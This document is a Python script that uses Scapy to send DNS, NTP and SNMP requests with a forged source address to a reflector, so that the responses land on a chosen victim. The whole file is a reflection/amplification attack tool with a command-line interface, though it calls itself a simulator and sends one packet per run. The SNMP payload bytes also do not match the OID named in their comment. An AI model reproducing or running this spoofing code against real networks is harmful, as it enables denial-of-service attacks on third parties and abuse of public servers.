from scapy.all import *
import argparse

# Default ports for the three services
SERVICE_PORTS = {
    'dns': 53,
    'ntp': 123,
    'snmp': 161
}

def build_packet(service, reflector_ip, victim_ip, port):
    if service == 'dns':
        # DNS query with RD=1, type=A
        dns_req = IP(dst=reflector_ip, src=victim_ip) / UDP(dport=port, sport=RandShort()) / DNS(rd=1, qd=DNSQR(qname='example.com', qtype='A'))
        return dns_req

    elif service == 'ntp':
        # Mode 3 NTP request (Client)
        ntp_req = IP(dst=reflector_ip, src=victim_ip) / UDP(dport=port, sport=RandShort()) / Raw(load='\x1b' + 47 * '\0')
        return ntp_req

    elif service == 'snmp':
        # SNMP GetRequest for OID 1.3.6.1.2.1.1.1.0 (sysDescr)
        snmp_payload = (
            b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x70\x69\x6e\x67\x02"
            b"\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
        )
        snmp_req = IP(dst=reflector_ip, src=victim_ip) / UDP(dport=port, sport=RandShort()) / Raw(load=snmp_payload)
        return snmp_req

    else:
        raise ValueError("Unsupported service. Only 'dns', 'ntp', and 'snmp' are supported.")

def main():
    parser = argparse.ArgumentParser(description="Scapy Amplification Attack Simulator")
    parser.add_argument("reflector_ip", help="IP address of the service to reflect from")
    parser.add_argument("service", choices=["dns", "ntp", "snmp"], help="Service to use")
    parser.add_argument("--victim_ip", help="IP of the victim to receive the amplified response (defaults to attacker)")
    parser.add_argument("--port", type=int, help="Override default port of the service")

    args = parser.parse_args()

    victim_ip = args.victim_ip if args.victim_ip else get_if_addr(conf.iface)
    port = args.port if args.port else SERVICE_PORTS[args.service.lower()]
    
    pkt = build_packet(args.service.lower(), args.reflector_ip, victim_ip, port)

    print(f"[+] Sending spoofed {args.service.upper()} packet to {args.reflector_ip} (will reflect to {victim_ip})")
    send(pkt, verbose=True)

if __name__ == "__main__":
    main()
